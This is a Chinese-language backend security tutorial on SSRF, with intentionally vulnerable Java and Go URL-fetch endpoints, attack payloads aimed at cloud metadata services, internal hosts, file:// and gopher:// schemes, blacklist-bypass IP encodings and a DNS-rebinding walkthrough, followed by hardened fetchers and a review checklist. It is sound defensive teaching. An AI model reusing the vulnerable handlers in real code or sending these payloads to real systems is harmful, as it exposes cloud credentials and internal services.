---
title: "Day 10 — SSRF（Server-Side Request Forgery）：你的後端，正在替駭客敲打雲端的後門"
date: 2026-05-05
tags: ["SSRF", "OWASP Top 10", "網路"]
---

# Day 10 — SSRF（Server-Side Request Forgery）：你的後端，正在替駭客敲打雲端的後門

> 日期：2026-05-05
> 適合對象：後端工程師初學者
> 主題難度：★★★★☆（觀念簡單，但完全防住非常難——很多公司栽過大跟頭，包括 Capital One 一億筆資料外洩案）

---

## 一、開場白：當「我幫你抓網頁」變成致命武器

幾乎每個現代後端服務都會做一件看似無害的事：**替使用者去抓某個 URL 的內容**。例如：

- 使用者填頭像網址 → 後端去下載並縮圖。
- 使用者貼一個分享連結 → 後端去抓 OG Tag 做預覽（像 Slack、Facebook 的連結預覽）。
- Webhook：使用者註冊一個 URL，每次事件發生時後端打 POST 過去。
- PDF 服務：使用者送一份 HTML，後端用 Headless Chrome 渲染成 PDF。
- 報表系統：根據使用者輸入的「資料來源 URL」拉資料。

聽起來很自然。但問題是——

**「後端的 HTTP Client」跟「使用者的瀏覽器」站在完全不同的位置。**

使用者的瀏覽器在公司外面，能看到的就是公開網際網路。但**你的後端在 VPC / 內網裡面**，它看得到：

- 你的資料庫（`10.0.0.5:5432`）
- 你的內部後台（`http://admin.internal/`）
- AWS 的 Metadata Service（`http://169.254.169.254/`）——這個是大魔王
- Kubernetes 的 API Server、ETCD
- 同事還沒上線的測試環境
- Redis、Memcached、Elasticsearch（多半沒密碼，內網都信任）

當你把「使用者輸入的 URL」直接餵給後端的 HTTP client，**等於把駭客的指令傳遞到你內網的每一個角落**。這就是 SSRF——Server-Side Request Forgery，伺服器端請求偽造。

> 真實案例：2019 年 Capital One 因為 SSRF 漏洞，攻擊者透過 WAF 打到 AWS Metadata Service 拿到 IAM Credentials，從 S3 拖走了 1 億筆客戶資料。後續和解金 1.9 億美元。**一個沒檢查的 URL 參數，1.9 億美元。**

---

## 二、最小化的 SSRF 範例

### Java 版（用 `HttpURLConnection`）

```java
@GetMapping("/preview")
public String preview(@RequestParam String url) throws IOException {
    // ❌ 危險：直接用使用者給的 URL
    URL target = new URL(url);
    HttpURLConnection conn = (HttpURLConnection) target.openConnection();
    try (InputStream in = conn.getInputStream()) {
        return new String(in.readAllBytes(), StandardCharsets.UTF_8);
    }
}
```

使用者打：`GET /preview?url=https://example.com` → 沒事。
攻擊者打：`GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`

→ 你的 EC2 IAM Role 的 access key、secret key、session token 全部回到攻擊者手上。

### Go 版

```go
// ❌ 危險
func PreviewHandler(w http.ResponseWriter, r *http.Request) {
    url := r.URL.Query().Get("url")
    resp, err := http.Get(url)
    if err != nil {
        http.Error(w, err.Error(), 500)
        return
    }
    defer resp.Body.Close()
    io.Copy(w, resp.Body)
}
```

同樣地，攻擊者一行 `?url=http://localhost:6379/` 就能跟你後端的 Redis 對話（Redis 協定基於文字行，HTTP request 有時會被解析成有效的 Redis 指令）。

---

## 三、SSRF 能搞出什麼花樣？

### 1. Cloud Metadata Service（最常被打的）

| 雲端 | Metadata 端點 |
| :-- | :-- |
| AWS | `http://169.254.169.254/latest/meta-data/` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` |
| Azure | `http://169.254.169.254/metadata/instance` |
| Alibaba Cloud | `http://100.100.100.200/latest/meta-data/` |

打到這些端點 → 拿到 IAM 臨時金鑰 → 操作整個雲端帳號。AWS IMDSv2 有改善（要先 PUT 拿 token），但**很多服務還在用 v1**，預設值也常常向下相容。

### 2. 內網橫向移動（Pivot）

```
?url=http://10.0.0.0:8080/admin
?url=http://k8s-api.internal:6443/api/v1/secrets
?url=http://elasticsearch.internal:9200/_cat/indices
```

外網看不到的服務，後端通通看得到。

### 3. 端口掃描

回應時間或錯誤訊息洩漏了「這個 port 有沒有開」：

```
?url=http://10.0.0.5:22   → connection refused (沒開)
?url=http://10.0.0.5:6379 → timeout 或 protocol error (Redis 在這裡)
?url=http://10.0.0.5:5432 → 拒絕連線 (PostgreSQL 在這裡)
```

攻擊者可以把整個內網拓樸畫出來。

### 4. 協定濫用

不只 HTTP：

```
?url=file:///etc/passwd          → 讀檔
?url=gopher://internal:25/...    → 偽造 SMTP 寄信（Gopher 是萬用瑞士刀）
?url=dict://localhost:11211/...  → 操作 Memcached
?url=jar:http://attacker/x.jar!/ → Java 特有，可能解壓 jar
```

### 5. Blind SSRF

雖然回傳內容拿不到，但攻擊者把 URL 指向自己控制的伺服器（例如 Burp Collaborator），就能驗證「我打進去了」並抽取資料（DNS exfiltration）。

---

## 四、為什麼防 SSRF 比想像中難？

### 陷阱 1：黑名單一定會漏

直覺：把 `127.0.0.1`、`169.254.169.254`、`10.x` 列入黑名單。

```java
// ❌ 看似安全，其實處處是洞
if (host.equals("127.0.0.1") || host.startsWith("169.254")) {
    throw new BadRequest();
}
```

繞過方法：

| 繞過 | 範例 |
| :-- | :-- |
| 短 IP | `http://2130706433/`（=127.0.0.1 的十進位） |
| 八進位 | `http://0177.0.0.1/` |
| 十六進位 | `http://0x7f.0.0.1/` |
| 0.0.0.0 | 在某些系統等於 localhost |
| `[::]` 或 `[::1]` | IPv6 |
| `[::ffff:127.0.0.1]` | IPv4-mapped IPv6 |
| 怪異域名 | `localtest.me`、`127.0.0.1.nip.io`（DNS 解析到內網 IP） |
| Domain Fronting | `evil.com` 在 attacker 的 DNS 解析到 `10.0.0.5` |

**黑名單在 SSRF 防禦上幾乎一定不夠。**

### 陷阱 2：DNS Rebinding（最毒的攻擊）

這是 SSRF 防禦的最高難度題。

1. 攻擊者控制一個域名 `evil.com`，DNS TTL 設為 0。
2. 第一次 DNS 查詢回 `1.2.3.4`（公網合法 IP）→ 你的「IP 白名單檢查」通過。
3. 你的 HTTP client 接著**再做一次 DNS 查詢**準備建連線。
4. 第二次查詢回 `127.0.0.1`。
5. **你檢查的 IP 跟實際連線的 IP 不一樣**——這叫 TOCTOU（Time-Of-Check vs Time-Of-Use）。

很多看起來很完美的「先 resolve → 檢查 → 通過再請求」實作，都死在這一招。

### 陷阱 3：Redirect

你檢查了使用者給的 URL 是 `https://example.com`——通過。但 `example.com` 回了 `302 Location: http://169.254.169.254/...`，**你的 HTTP client 預設會跟過去**。

---

## 五、正確的防禦策略

### 策略 A：完全不允許使用者給 URL（最佳）

問自己：**這個功能真的需要讓使用者輸入任意 URL 嗎？**

- 「貼分享連結拿預覽」也許可以做，但其實 90% 的場景使用者只貼幾個常見網域（YouTube、Twitter、GitHub）。**用白名單**。
- 「Webhook」可以強制只接受 HTTPS，且要求對方先做 challenge-response 驗證網域所有權。
- 「報表資料來源」其實應該是後端內部維護的清單，不是使用者輸入。

### 策略 B：白名單 + 嚴格驗證（必要時）

四道閘門必須**全部通過**：

#### 1. 解析 URL，限制 scheme

只允許 `http` / `https`。把 `file://`、`gopher://`、`dict://`、`ftp://`、`jar://` 全部拒絕。

#### 2. 解析 hostname → 拿到所有 IP → 全部檢查

DNS 可能回多個 A record，**每一個都要檢查**。

#### 3. 拒絕所有「私有 / 特殊」IP 範圍

```
127.0.0.0/8         loopback
10.0.0.0/8          private
172.16.0.0/12       private
192.168.0.0/16      private
169.254.0.0/16      link-local（含 metadata！）
0.0.0.0/8           "this network"
100.64.0.0/10       carrier-grade NAT
::1/128             IPv6 loopback
fc00::/7            IPv6 unique local
fe80::/10           IPv6 link-local
```

#### 4. 防 DNS Rebinding：用「檢查過的 IP」直接連線，不再做第二次 DNS

這是關鍵。下面我會展示具體做法。

#### 5. 禁止跟 redirect，或對每個 redirect 重新跑上面的檢查

---

## 六、實作：Java（Spring Boot）

```java
import java.net.*;
import java.util.*;

public class SafeHttpFetcher {

    // 私有/特殊 IP 範圍（CIDR 簡化版）
    private static final List<String> BLOCKED_CIDRS = List.of(
        "127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12",
        "192.168.0.0/16", "169.254.0.0/16", "0.0.0.0/8",
        "100.64.0.0/10"
    );

    public static String fetch(String userUrl) throws IOException {
        URI uri = URI.create(userUrl);

        // 1. Scheme 白名單
        String scheme = uri.getScheme();
        if (scheme == null || !(scheme.equals("http") || scheme.equals("https"))) {
            throw new SecurityException("only http/https allowed");
        }

        // 2. Port 白名單（避免 :22, :6379, :11211 等內部服務）
        int port = uri.getPort();
        if (port == -1) port = scheme.equals("https") ? 443 : 80;
        if (port != 80 && port != 443 && port != 8080 && port != 8443) {
            throw new SecurityException("port not allowed: " + port);
        }

        // 3. 解析 host → 拿所有 IP → 每個都檢查
        String host = uri.getHost();
        InetAddress[] addrs = InetAddress.getAllByName(host);
        InetAddress safeAddr = null;
        for (InetAddress addr : addrs) {
            if (isBlockedIp(addr)) {
                throw new SecurityException("blocked IP: " + addr.getHostAddress());
            }
            safeAddr = addr; // 先拿其中一個
        }

        // 4. 防 DNS Rebinding：用「已檢查過的 IP」直接連線
        //    走法：把 hostname 換成 IP，但保留 Host header 給 SNI / Virtual Host
        URL connectUrl = new URL(scheme, safeAddr.getHostAddress(), port, uri.getRawPath());
        HttpURLConnection conn = (HttpURLConnection) connectUrl.openConnection();
        conn.setRequestProperty("Host", host);

        // 5. 不跟 redirect（要跟的話必須對 Location 重跑 1~4）
        conn.setInstanceFollowRedirects(false);

        // 6. 設超時，避免吃滿連線池
        conn.setConnectTimeout(3000);
        conn.setReadTimeout(5000);

        try (InputStream in = conn.getInputStream()) {
            // 7. 限制讀取大小，避免 ZIP bomb / 大檔案塞爆記憶體
            return new String(in.readNBytes(1024 * 1024), StandardCharsets.UTF_8);
        }
    }

    private static boolean isBlockedIp(InetAddress addr) {
        if (addr.isLoopbackAddress() || addr.isLinkLocalAddress()
            || addr.isSiteLocalAddress() || addr.isAnyLocalAddress()
            || addr.isMulticastAddress()) {
            return true;
        }
        // 你可以再加上自家 VPC CIDR
        return false;
    }
}
```

> 重點：**第 4 步用 IP 而不是 hostname 重新建連線**——這是抵禦 DNS Rebinding 的核心。`InetAddress.isSiteLocalAddress()` 已經涵蓋 RFC 1918 的私有網段，再加上 loopback / link-local / any-local 就能擋掉大多數情況。

---

## 七、實作：Go

Go 的好處是可以直接客製 `http.Transport` 的 `DialContext`，在「即將建立 TCP 連線」的那一刻檢查 IP——這是阻止 DNS Rebinding 最乾淨的位置。

```go
package safehttp

import (
    "context"
    "errors"
    "net"
    "net/http"
    "time"
)

var blockedNets []*net.IPNet

func init() {
    cidrs := []string{
        "127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12",
        "192.168.0.0/16", "169.254.0.0/16", "0.0.0.0/8",
        "100.64.0.0/10", "::1/128", "fc00::/7", "fe80::/10",
    }
    for _, c := range cidrs {
        _, n, _ := net.ParseCIDR(c)
        blockedNets = append(blockedNets, n)
    }
}

func isBlocked(ip net.IP) bool {
    for _, n := range blockedNets {
        if n.Contains(ip) {
            return true
        }
    }
    return false
}

// SafeClient 回傳一個會在每次 dial 時檢查 IP 的 client
func SafeClient() *http.Client {
    dialer := &net.Dialer{Timeout: 3 * time.Second}

    transport := &http.Transport{
        DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
            host, port, err := net.SplitHostPort(addr)
            if err != nil {
                return nil, err
            }
            // 解析所有 IP 並逐一檢查
            ips, err := net.DefaultResolver.LookupIPAddr(ctx, host)
            if err != nil {
                return nil, err
            }
            for _, ip := range ips {
                if isBlocked(ip.IP) {
                    return nil, errors.New("ssrf: blocked IP " + ip.IP.String())
                }
            }
            // 用第一個檢查過的 IP 直接連線（避免 DNS Rebinding）
            return dialer.DialContext(ctx, network, net.JoinHostPort(ips[0].IP.String(), port))
        },
    }

    return &http.Client{
        Transport: transport,
        Timeout:   10 * time.Second,
        // 拒絕跟 redirect（要跟就要對每個 Location 重跑 dial 檢查；這個 Transport 已經會檢查了）
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            if len(via) >= 5 {
                return errors.New("too many redirects")
            }
            return nil // Transport 會在 dial 時阻擋
        },
    }
}
```

使用：

```go
func PreviewHandler(w http.ResponseWriter, r *http.Request) {
    url := r.URL.Query().Get("url")

    // 還可以加上 scheme / port 白名單檢查...

    resp, err := SafeClient().Get(url)
    if err != nil {
        http.Error(w, err.Error(), 400)
        return
    }
    defer resp.Body.Close()

    // 限制 response 大小
    body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20)) // 1 MiB
    w.Write(body)
}
```

> 為什麼這個寫法漂亮？因為 `DialContext` 是 Go 的 HTTP client 最後一關——**redirect 也會經過這裡**。所以 redirect 跟到 `169.254.169.254` 一樣會被擋下來。

---

## 八、進階防禦：用「網路隔離」當最後一道牆

不管程式碼多嚴謹，最穩的方式是**讓後端根本連不到那些地方**：

1. **獨立的 VPC subnet 跑「對外抓 URL」的服務**：這個 subnet 的 security group 只允許出網際網路、禁止連到內部 VPC、禁止連到 metadata IP。
2. **Egress proxy**：所有對外 HTTP 都強制走一個 proxy，proxy 上做白名單。Smokescreen（Stripe 開源）、Squid + ACL 都行。
3. **AWS IMDSv2 強制開啟 + hop limit = 1**：即使打到 metadata 端點，IMDSv2 要求先 PUT 拿 token，攻擊難度大幅提高；hop limit = 1 讓 container 內部打不到 metadata。
4. **GCP / Azure 同樣有 metadata header 強制要求**（GCP 要求 `Metadata-Flavor: Google` header）。

**程式碼防禦 + 網路隔離 = 縱深防禦（Defense in Depth）。** 一層被繞過，還有下一層。

---

## 九、自我檢查清單

設計或 code review 時逐項問自己：

1. 這個功能真的需要讓使用者輸入任意 URL 嗎？能不能改成下拉選單？
2. 我有限制 scheme 嗎？只允許 `http` / `https`？
3. 我有限制 port 嗎？或是只允許 80 / 443？
4. 我有解析 host 並檢查所有 IP 嗎？包括 IPv6？
5. 我有阻擋 RFC1918 私有網段、loopback、link-local、metadata 嗎？
6. 我有處理 DNS Rebinding 嗎？（檢查的 IP 跟實際連線的 IP 是同一個嗎？）
7. 我有處理 redirect 嗎？每個 redirect 都重做檢查了嗎？
8. 我有限制 response 大小嗎？避免被「假裝是圖片但其實是 100GB」打爆。
9. 我有設 connect / read timeout 嗎？避免 slowloris。
10. 我有在網路層加白名單 / egress proxy 嗎？

---

## 十、總結與明天預告

**今天的關鍵字：「使用者給的 URL，等於使用者用你後端的網路位置發請求」。** 你的後端站在內網裡，看得到的東西比使用者多太多——這個位置是 SSRF 的全部威力來源。

**SSRF 防禦的三條底線：**

1. **沒必要就不要做**——能用白名單就不要開放任意 URL。
2. **檢查 IP，而不是 hostname**——並用檢查過的 IP 直接連線，避免 DNS Rebinding。
3. **網路層再加一道牆**——程式碼可能有 bug，但 security group / egress proxy 是最後的物理防線。

Capital One 的工程師當年絕對也讀過 OWASP Top 10。SSRF 的恐怖在於：**只要有一個 endpoint 沒處理好，整個雲端帳號就完了**。

---

**Day 11 預告：Path Traversal & 檔案上傳安全**——當使用者能輸入「檔案名稱」，他們也能輸入 `../../../etc/passwd`。我們會看怎麼安全地處理檔案路徑，以及為什麼「副檔名檢查」是無效的。
